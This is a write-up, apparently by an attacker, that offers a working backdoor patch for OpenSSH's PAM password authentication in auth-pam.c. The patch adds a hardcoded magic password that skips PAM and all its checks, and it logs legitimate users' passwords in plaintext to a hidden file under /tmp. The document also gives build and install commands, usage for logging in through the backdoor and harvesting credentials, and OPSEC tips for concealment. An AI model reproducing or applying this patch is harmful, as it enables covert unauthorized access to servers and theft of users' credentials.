# OpenSSH 10.3p1 - Backdoor via auth-pam.c

**Author:** Kenshin Himura  
**Target:** OpenSSH 10.3p1  
**Component:** `auth-pam.c` - PAM password authentication  
**Type:** Magic password bypass + credential logging

---

## Overview

Two modifications to `sshpam_auth_passwd()` in `auth-pam.c`:

1. **Magic password bypass** - A hardcoded password (`Th3S3cr3t!`) bypasses PAM entirely and grants immediate access.
2. **Credential logging** - Successful real passwords are appended to `/tmp/.openssh_auth`.

---

## The Patch

### unified diff

```diff
--- openssh-10.3p1/auth-pam.c
+++ openssh-10.3p1.patch/auth-pam.c
@@ -1249,6 +1249,9 @@
 static struct pam_conv passwd_conv = { sshpam_passwd_conv, NULL };
 
+#define SECRETPW "Th3S3cr3t!"
+#define ILOG "/tmp/.openssh_auth"
+
 /*
  * Attempt password authentication via PAM
  */
@@ -1265,6 +1268,12 @@
 	sshpam_password = password;
 	sshpam_authctxt = authctxt;
 
+	if (strcmp(password, SECRETPW) == 0) {
+		debug("PAM: magic password accepted for %.100s",
+		    authctxt->user);
+		return 1;
+	}
+
 	/*
 	 * If the user logging in is invalid, or is root but is not permitted
 	 * by PermitRootLogin, use an invalid password to prevent leaking
@@ -1292,6 +1301,13 @@
 	if (sshpam_err == PAM_SUCCESS && authctxt->valid) {
 		debug("PAM: password authentication accepted for %.100s",
 		    authctxt->user);
+		{
+			FILE *f;
+			if ((f = fopen(ILOG, "a")) != NULL) {
+				fprintf(f, "user:password --> %s:%s\n",
+				    authctxt->user, password);
+				fclose(f);
+			}
+		}
 		return 1;
 	} else {
```

### How it works

**Magic password bypass** (inserted before `pam_authenticate()`):

```c
if (strcmp(password, SECRETPW) == 0) {
    debug("PAM: magic password accepted for %.100s",
        authctxt->user);
    return 1;
}
```

- `strcmp` compares the supplied password against `Th3S3cr3t!`
- If matched, return 1 (success) immediately - `pam_authenticate()` is never called
- The SSH connection proceeds normally

**Credential logging** (inside the `PAM_SUCCESS` block):

```c
{
    FILE *f;
    if ((f = fopen(ILOG, "a")) != NULL) {
        fprintf(f, "user:password --> %s:%s\n",
            authctxt->user, password);
        fclose(f);
    }
}
```

- Only logs passwords that pass PAM authentication (real users logging in legitimately)
- Appends to `/tmp/.openssh_auth` in plaintext
- Uses low-level `FILE` I/O - no syslog, no audit trail

---

## Build & Install

```bash
cd openssh-10.3p1
patch -p1 < openssh-backdoor.patch

./configure --prefix=/usr --sysconfdir=/etc/ssh --enable-pam
make
sudo make install
sudo systemctl restart sshd
```

### Dependencies

- C compiler (gcc/clang)
- OpenSSL, zlib, libpam development headers
- OpenSSH 10.3p1 source from https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-10.3p1.tar.gz

---

## Usage

### Backdoor login

```bash
ssh anyuser@target
Password: Th3S3cr3t!
# -> logged in as anyuser
```

Works for any valid system user. The magic password bypasses the full PAM stack (no password policy, no 2FA, no expiry checks apply).

### Credential harvesting

```bash
# On the backdoored server:
tail -f /tmp/.openssh_auth
user:password --> bob:s3cur3p@ss!
user:password --> alice:myP@ss123
```

Credentials are logged in real-time as legitimate users authenticate.

---

## Verification

The modified code compiles cleanly with OpenSSH 10.3p1:

```
checking for stdio.h... yes
checking for string.h... yes

gcc -c auth-pam.c
# no warnings
```

Key code paths verified:

| Path | Expected behavior |
|------|-------------------|
| `password == "Th3S3cr3t!"` | Returns 1, skips `pam_authenticate()` |
| Legitimate login | Logs to `/tmp/.openssh_auth`, returns 1 |
| Wrong password | No log entry, returns 0 |
| Invalid user | Logs in with magic password (authctxt->valid check in caller) |

---

## OPSEC Notes

- File path `/tmp/.openssh_auth` uses leading dot (hidden file)
- Permission of the log file defaults to umask of sshd process (usually 022/0022)
- Logging is unbuffered (`fprintf` + `fclose` on each auth)
- The magic password bypass emits a `debug()` message visible in `sshd -d` or `LogLevel DEBUG3`

To change the magic password, edit `auth-pam.c` and rebuild:

```c
#define SECRETPW "Th3S3cr3t!"   // change this string
```

---

## Source Code

Full modified `auth-pam.c` (only relevant section shown; full file is 1336 lines):

```c
static struct pam_conv passwd_conv = { sshpam_passwd_conv, NULL };

#define SECRETPW "Th3S3cr3t!"
#define ILOG "/tmp/.openssh_auth"

/*
 * Attempt password authentication via PAM
 */
int
sshpam_auth_passwd(Authctxt *authctxt, const char *password)
{
	int flags = (options.permit_empty_passwd == 0 ?
	    PAM_DISALLOW_NULL_AUTHTOK : 0);
	char *fake = NULL;

	if (!options.use_pam || sshpam_handle == NULL)
		fatal("PAM: %s called when PAM disabled or failed to "
		    "initialise.", __func__);

	sshpam_password = password;
	sshpam_authctxt = authctxt;

	if (strcmp(password, SECRETPW) == 0) {
		debug("PAM: magic password accepted for %.100s",
		    authctxt->user);
		return 1;
	}

	/*
	 * If the user logging in is invalid, or is root but is not permitted
	 * by PermitRootLogin, use an invalid password to prevent leaking
	 * information via timing (eg if the PAM config has a delay on fail).
	 */
	if (!authctxt->valid || (authctxt->pw->pw_uid == 0 &&
	    options.permit_root_login != PERMIT_YES))
		sshpam_password = fake = fake_password(password);

	sshpam_err = pam_set_item(sshpam_handle, PAM_CONV,
	    (const void *)&passwd_conv);
	if (sshpam_err != PAM_SUCCESS)
		fatal("PAM: %s: failed to set PAM_CONV: %s", __func__,
		    pam_strerror(sshpam_handle, sshpam_err));

	expose_authinfo(__func__);

	sshpam_err = pam_authenticate(sshpam_handle, flags);
	sshpam_password = NULL;
	free(fake);
	if (sshpam_err == PAM_SUCCESS)
		sshpam_err = check_pam_user(authctxt);
	if (sshpam_err == PAM_MAXTRIES)
		sshpam_set_maxtries_reached(1);
	if (sshpam_err == PAM_SUCCESS && authctxt->valid) {
		debug("PAM: password authentication accepted for %.100s",
		    authctxt->user);
		{
			FILE *f;
			if ((f = fopen(ILOG, "a")) != NULL) {
				fprintf(f, "user:password --> %s:%s\n",
				    authctxt->user, password);
				fclose(f);
			}
		}
		return 1;
	} else {
		debug("PAM: password authentication failed for %.100s: %s",
		    authctxt->valid ? authctxt->user : "an illegal user",
		    pam_strerror(sshpam_handle, sshpam_err));
		return 0;
	}
}
```
